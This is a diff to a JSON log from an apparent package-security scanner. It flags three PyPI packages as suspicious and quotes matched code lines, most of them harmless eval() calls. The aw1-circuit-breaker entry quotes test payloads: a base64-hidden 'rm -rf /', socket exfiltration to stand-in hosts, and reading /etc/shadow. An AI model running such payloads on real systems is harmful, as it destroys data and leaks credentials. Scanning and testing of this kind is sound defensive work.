@@ -42790,5 +42790,953 @@
         "code_snippet": "raw_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
       }
     ]
+  },
+  {
+    "package_name": "theclassifier",
+    "checked_at": "2026-10-07T01:02:58.844666",
+    "download_url": "https://files.pythonhosted.org/packages/7c/6a/2f4a0e08aa61dd9f19a299125d4f557aef98c19651c65c4ef667a9747ea1/theclassifier-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "theclassifier-0.1.0/src/theclassifier/model.py",
+        "line": 73,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.model.eval()"
+      },
+      {
+        "file": "theclassifier-0.1.0/src/theclassifier/model.py",
+        "line": 104,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.model.eval()"
+      },
+      {
+        "file": "theclassifier-0.1.0/src/theclassifier/model.py",
+        "line": 129,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.model.eval()"
+      }
+    ]
+  },
+  {
+    "package_name": "aw1-circuit-breaker",
+    "checked_at": "2026-10-07T01:02:59.590040",
+    "download_url": "https://files.pythonhosted.org/packages/db/db/4f46abca45aa9668e5bdb556f35b510abc1f3c4ecbadaec9977f2110767c/aw1_circuit_breaker-0.1.1.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "aw1_circuit_breaker-0.1.1/aw1/unpacker.py",
+        "line": 15,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"eval(\", \"exec(\", \"system(\", \"popen(\", \"subprocess\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/aw1/unpacker.py",
+        "line": 15,
+        "keyword_detected": "exec(",
+        "code_snippet": "\"eval(\", \"exec(\", \"system(\", \"popen(\", \"subprocess\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/aw1/unpacker.py",
+        "line": 34,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "decoded = base64.b64decode(b64_content).decode(\"utf-8\", errors=\"ignore\")"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/aw1_daemon/cli.py",
+        "line": 39,
+        "keyword_detected": "exec(",
+        "code_snippet": "def cmd_exec(daemon: AW1Daemon, args: argparse.Namespace):"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/aw1_daemon/cli.py",
+        "line": 116,
+        "keyword_detected": "exec(",
+        "code_snippet": "cmd_exec(daemon, args)"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/aw1_mcp_server.py",
+        "line": 23,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "\"eval\", \"exec\", \"compile\", \"__import__\", \"os.system\", \"subprocess.Popen\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/aw1_mcp_server.py",
+        "line": 24,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "\"subprocess.run\", \"socket.socket\", \"urllib.request\", \"requests.post\", \"shutil.rmtree\""
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/aw1_mcp_server.py",
+        "line": 89,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"description\": \"Pre-execution circuit breaker: decomposes agent payloads into AST primitives to detect shell injections, unauthorized socket egress, and dynamic eval() loops in <0.5ms.\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/benchmark_mcp_breaker.py",
+        "line": 17,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"description\": \"Base64 Steganography & Dynamic eval() bypass\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/benchmark_mcp_breaker.py",
+        "line": 19,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "\"args\": {\"code\": \"import base64; eval(compile(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp'), '<eval>', 'exec'))\"},"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/benchmark_mcp_breaker.py",
+        "line": 19,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"args\": {\"code\": \"import base64; eval(compile(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp'), '<eval>', 'exec'))\"},"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/benchmark_mcp_breaker.py",
+        "line": 26,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "\"args\": {\"code\": \"import socket; s = socket.socket(); s.connect(('198.51.100.1', 4444)); s.send(b'LVT_EXFIL')\"},"
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/benchmark_mcp_breaker.py",
+        "line": 50,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "proc = subprocess.Popen("
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/scripts/test_mcp_client.py",
+        "line": 6,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self.proc = subprocess.Popen("
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/tests/adversarial_stress_test_suite.py",
+        "line": 24,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"name\": \"Base64 Obfuscated eval() Execution Probe\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/tests/adversarial_stress_test_suite.py",
+        "line": 27,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "\"payload\": \"import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='))\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/tests/adversarial_stress_test_suite.py",
+        "line": 27,
+        "keyword_detected": "exec(",
+        "code_snippet": "\"payload\": \"import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='))\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/tests/adversarial_stress_test_suite.py",
+        "line": 35,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "\"payload\": \"import socket; s = socket.socket(); s.connect(('exfil.external-host.io', 8443))\","
+      },
+      {
+        "file": "aw1_circuit_breaker-0.1.1/tests/adversarial_stress_test_suite.py",
+        "line": 43,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "\"payload\": \"import subprocess; subprocess.Popen(['cat', '/etc/shadow'])\","
+      }
+    ]
+  },
+  {
+    "package_name": "aspire-si",
+    "checked_at": "2026-10-07T01:03:00.079390",
+    "download_url": "https://files.pythonhosted.org/packages/ab/56/615bc59de9a7869826be56ead7d5264cd5a81a65890e0986f55daa898656/aspire_si-1.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "aspire_si-1.1.0/aspire/trainer.py",
+        "line": 501,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.student_model.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/trainer.py",
+        "line": 502,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/critic/base.py",
+        "line": 115,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/critic/separate.py",
+        "line": 225,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/critic/shared.py",
+        "line": 202,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/dialogue/generator.py",
+        "line": 172,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.student_model.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/dialogue/generator.py",
+        "line": 263,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.student_model.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/aspire/teachers/local.py",
+        "line": 70,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.model.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_critic.py",
+        "line": 467,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_critic.py",
+        "line": 490,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_teacher.py",
+        "line": 371,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"eval(\": (\"Code injection risk\", \"Never use eval() with untrusted input\", \"HIGH\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_teacher.py",
+        "line": 372,
+        "keyword_detected": "exec(",
+        "code_snippet": "\"exec(\": (\"Code injection risk\", \"Avoid exec() - use safer alternatives\", \"HIGH\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_teacher.py",
+        "line": 434,
+        "keyword_detected": "eval(",
+        "code_snippet": "if pattern in (\"eval(\", \"exec(\") and re.search("
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/code_teacher.py",
+        "line": 434,
+        "keyword_detected": "exec(",
+        "code_snippet": "if pattern in (\"eval(\", \"exec(\") and re.search("
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/trainer.py",
+        "line": 271,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/trainer.py",
+        "line": 340,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/trainer.py",
+        "line": 505,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/examples/basic_critique.py",
+        "line": 31,
+        "keyword_detected": "eval(",
+        "code_snippet": "result = eval(user_input)  # Execute user code"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/examples/train_critic.py",
+        "line": 84,
+        "keyword_detected": "eval(",
+        "code_snippet": "y = eval(x)"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/code/examples/train_critic.py",
+        "line": 158,
+        "keyword_detected": "eval(",
+        "code_snippet": "return eval(x)"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/forge/image_critic.py",
+        "line": 153,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/forge/image_critic.py",
+        "line": 260,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/isaac/trainer.py",
+        "line": 408,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/isaac/trainer.py",
+        "line": 613,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.policy.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/integrations/isaac/trainer.py",
+        "line": 614,
+        "keyword_detected": "eval(",
+        "code_snippet": "self.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/conftest.py",
+        "line": 215,
+        "keyword_detected": "eval(",
+        "code_snippet": "y = eval(x)"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 113,
+        "keyword_detected": "eval(",
+        "code_snippet": "y = eval(x)"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 193,
+        "keyword_detected": "eval(",
+        "code_snippet": "pe.eval()  # Disable dropout for testing"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 217,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_positional_encoding_deterministic_eval(self, batch_size, hidden_dim):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 220,
+        "keyword_detected": "eval(",
+        "code_snippet": "pe.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 662,
+        "keyword_detected": "eval(",
+        "code_snippet": "def tracked_eval():"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_code_critic.py",
+        "line": 665,
+        "keyword_detected": "eval(",
+        "code_snippet": "return original_eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_critic.py",
+        "line": 48,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_predict_score_returns_float_and_sets_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_critic.py",
+        "line": 195,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_critic.py",
+        "line": 203,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_critic.py",
+        "line": 213,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_critic.py",
+        "line": 221,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_teachers.py",
+        "line": 118,
+        "keyword_detected": "eval(",
+        "code_snippet": "async def test_run_dialogue_records_turns_and_final_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_coverage_teachers.py",
+        "line": 135,
+        "keyword_detected": "eval(",
+        "code_snippet": "async def test_run_dialogue_without_per_turn_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 201,
+        "keyword_detected": "eval(",
+        "code_snippet": "# Track if eval() was called"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 205,
+        "keyword_detected": "eval(",
+        "code_snippet": "def tracked_eval():"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 208,
+        "keyword_detected": "eval(",
+        "code_snippet": "return original_eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 1092,
+        "keyword_detected": "eval(",
+        "code_snippet": "head.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 1109,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_critic_deterministic_in_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_critics.py",
+        "line": 1112,
+        "keyword_detected": "eval(",
+        "code_snippet": "head.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_dialogue.py",
+        "line": 406,
+        "keyword_detected": "eval(",
+        "code_snippet": "async def test_generator_generate_dialogue_per_turn_eval("
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_dialogue.py",
+        "line": 429,
+        "keyword_detected": "eval(",
+        "code_snippet": "async def test_generator_generate_dialogue_skip_per_turn_eval("
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_teachers.py",
+        "line": 486,
+        "keyword_detected": "eval(",
+        "code_snippet": "async def test_base_teacher_run_dialogue_with_turn_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_teachers_local.py",
+        "line": 237,
+        "keyword_detected": "eval(",
+        "code_snippet": "def mock_teacher_for_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/test_trainer.py",
+        "line": 710,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_trainer_train_with_eval(self, mock_trainer):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_analysis_comprehensive.py",
+        "line": 404,
+        "keyword_detected": "eval(",
+        "code_snippet": "eval(\"code\")  # security issue"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 52,
+        "keyword_detected": "eval(",
+        "code_snippet": "pe = PositionalEncoding(d_model=8, max_len=32, dropout=0.0).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 67,
+        "keyword_detected": "eval(",
+        "code_snippet": "pe.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 85,
+        "keyword_detected": "eval(",
+        "code_snippet": ").eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 211,
+        "keyword_detected": "eval(",
+        "code_snippet": "return CodeCriticHead(hidden_dim=16, reasoning_dim=6, fix_dim=10).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 333,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_forward_is_deterministic_in_eval(self, tiny_critic):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_critic_unit.py",
+        "line": 334,
+        "keyword_detected": "eval(",
+        "code_snippet": "tiny_critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 151,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_detects_eval(self, auditor):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 152,
+        "keyword_detected": "eval(",
+        "code_snippet": "\"\"\"Should flag eval() usage.\"\"\""
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 155,
+        "keyword_detected": "eval(",
+        "code_snippet": "return eval(data)"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 164,
+        "keyword_detected": "exec(",
+        "code_snippet": "def test_detects_exec(self, auditor):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 165,
+        "keyword_detected": "exec(",
+        "code_snippet": "\"\"\"Should flag exec() usage.\"\"\""
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 168,
+        "keyword_detected": "exec(",
+        "code_snippet": "exec(code)"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_comprehensive.py",
+        "line": 353,
+        "keyword_detected": "eval(",
+        "code_snippet": "result = eval(data)  # Security issue"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 330,
+        "keyword_detected": "eval(",
+        "code_snippet": "code = \"x = 1\\nresult = eval(user)\\nother = eval(user2)\\n\""
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 334,
+        "keyword_detected": "eval(",
+        "code_snippet": "assert c.suggestions == [\"Never use eval() with untrusted input\"]"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 358,
+        "keyword_detected": "eval(",
+        "code_snippet": "c = auditor.critique(py(\"eval(a)\\neval(b)\\nexec(c)\\n\"))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 358,
+        "keyword_detected": "exec(",
+        "code_snippet": "c = auditor.critique(py(\"eval(a)\\neval(b)\\nexec(c)\\n\"))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 364,
+        "keyword_detected": "eval(",
+        "code_snippet": "(\"eval(a)\", 3.0),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 365,
+        "keyword_detected": "exec(",
+        "code_snippet": "(\"exec(a)\", 3.0),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 395,
+        "keyword_detected": "eval(",
+        "code_snippet": "c = auditor.critique(py(\"name = input()\\neval(name)\\n\"))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 400,
+        "keyword_detected": "eval(",
+        "code_snippet": "c = auditor.critique(py(\"eval( input() )\\n\"))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 404,
+        "keyword_detected": "eval(",
+        "code_snippet": "c = SecurityAuditor().critique(CodeSample(code=\"def f(): eval(input())\", language=Language.PYTHON))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 485,
+        "keyword_detected": "eval(",
+        "code_snippet": "auditor.critique(CodeSample(code=\"eval(x)\", language=Language.JAVASCRIPT))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 492,
+        "keyword_detected": "eval(",
+        "code_snippet": "(\"eval(a)\\n\", \"Code has minor security considerations\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 493,
+        "keyword_detected": "eval(",
+        "code_snippet": "(\"eval(a)\\npassword = 1\\n\", \"Code has security issues that should be fixed\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 494,
+        "keyword_detected": "eval(",
+        "code_snippet": "(\"eval(a)\\nexec(b)\\nos.system(c)\\nyaml.load(d)\\n\", \"CRITICAL: Code has serious security vulnerabilities.\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 494,
+        "keyword_detected": "exec(",
+        "code_snippet": "(\"eval(a)\\nexec(b)\\nos.system(c)\\nyaml.load(d)\\n\", \"CRITICAL: Code has serious security vulnerabilities.\"),"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 502,
+        "keyword_detected": "eval(",
+        "code_snippet": "[\"eval(a)\", \"exec(b)\", \"os.system(c)\", \"yaml.load(d)\", \"md5(e)\", \"sha1(f)\", \"password = 1\", \"secret = 2\"]"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 502,
+        "keyword_detected": "exec(",
+        "code_snippet": "[\"eval(a)\", \"exec(b)\", \"os.system(c)\", \"yaml.load(d)\", \"md5(e)\", \"sha1(f)\", \"password = 1\", \"secret = 2\"]"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_teachers_unit.py",
+        "line": 1037,
+        "keyword_detected": "eval(",
+        "code_snippet": "c = t.critique(CodeSample(code=\"def f(): eval(input())\", language=Language.PYTHON))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/code/test_code_trainer_unit.py",
+        "line": 674,
+        "keyword_detected": "eval(",
+        "code_snippet": "trainer.critic.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 118,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = _make_critic().eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 130,
+        "keyword_detected": "eval(",
+        "code_snippet": "out = _make_critic().eval()(_images(4))"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 136,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = _make_critic().eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 142,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_forward_is_deterministic_in_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 143,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = _make_critic().eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 149,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = _make_critic().eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 166,
+        "keyword_detected": "eval(",
+        "code_snippet": "def test_predict_score_is_mean_float_and_switches_to_eval(self):"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 197,
+        "keyword_detected": "eval(",
+        "code_snippet": "return LatentCritic(latent_channels=4, hidden_dim=16).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_image_critic.py",
+        "line": 235,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = LatentCritic(latent_channels=3, hidden_dim=16).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_vision_teacher.py",
+        "line": 225,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "assert base64.b64decode(encoded) == PNG_BYTES"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_vision_teacher.py",
+        "line": 277,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "assert base64.b64decode(image_block[\"source\"][\"data\"]) == PNG_BYTES"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/forge/test_vision_teacher.py",
+        "line": 384,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "assert base64.b64decode(url.split(\",\", 1)[1]) == PNG_BYTES"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 38,
+        "keyword_detected": "eval(",
+        "code_snippet": "return TrajectoryEncoder(**kwargs).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 78,
+        "keyword_detected": "eval(",
+        "code_snippet": "module = PositionalEncoding(d_model=8, max_len=10, dropout=0.5).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 186,
+        "keyword_detected": "eval(",
+        "code_snippet": "return MotionCriticHead(**kwargs).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 255,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config(arch)).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 277,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config()).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 282,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config(CriticArchitecture.TCN)).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 290,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config(predict_improvement=False)).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 297,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config()).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/integrations/isaac/test_trajectory_critic.py",
+        "line": 320,
+        "keyword_detected": "eval(",
+        "code_snippet": "critic = TrajectoryCritic(make_config(CriticArchitecture.LSTM)).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_integration.py",
+        "line": 42,
+        "keyword_detected": "eval(",
+        "code_snippet": "return PerceptionModule(_config(**overrides), hidden_dim=H).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_integration.py",
+        "line": 641,
+        "keyword_detected": "eval(",
+        "code_snippet": "target = PerceptionModule(_config(), hidden_dim=H).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_integration.py",
+        "line": 652,
+        "keyword_detected": "eval(",
+        "code_snippet": "target = PerceptionModule(_config(), hidden_dim=H).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_metacognition_more.py",
+        "line": 61,
+        "keyword_detected": "eval(",
+        "code_snippet": "est.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_metacognition_more.py",
+        "line": 398,
+        "keyword_detected": "eval(",
+        "code_snippet": "module.eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 246,
+        "keyword_detected": "eval(",
+        "code_snippet": "det = SyntropicResonanceDetector(hidden_dim=16).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 270,
+        "keyword_detected": "eval(",
+        "code_snippet": "integ = SyntropicIntegrator(hidden_dim=16, num_heads=4).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 281,
+        "keyword_detected": "eval(",
+        "code_snippet": "integ = SyntropicIntegrator(hidden_dim=16, num_heads=4).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 292,
+        "keyword_detected": "eval(",
+        "code_snippet": "integ = SyntropicIntegrator(hidden_dim=16, num_heads=4).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 300,
+        "keyword_detected": "eval(",
+        "code_snippet": "integ = SyntropicIntegrator(hidden_dim=16, num_heads=4).eval()"
+      },
+      {
+        "file": "aspire_si-1.1.0/tests/perception/test_syntropy_more.py",
+        "line": 411,
+        "keyword_detected": "eval(",
+        "code_snippet": "return SyntropicEngine(hidden_dim=16).eval()"
+      },
+      {
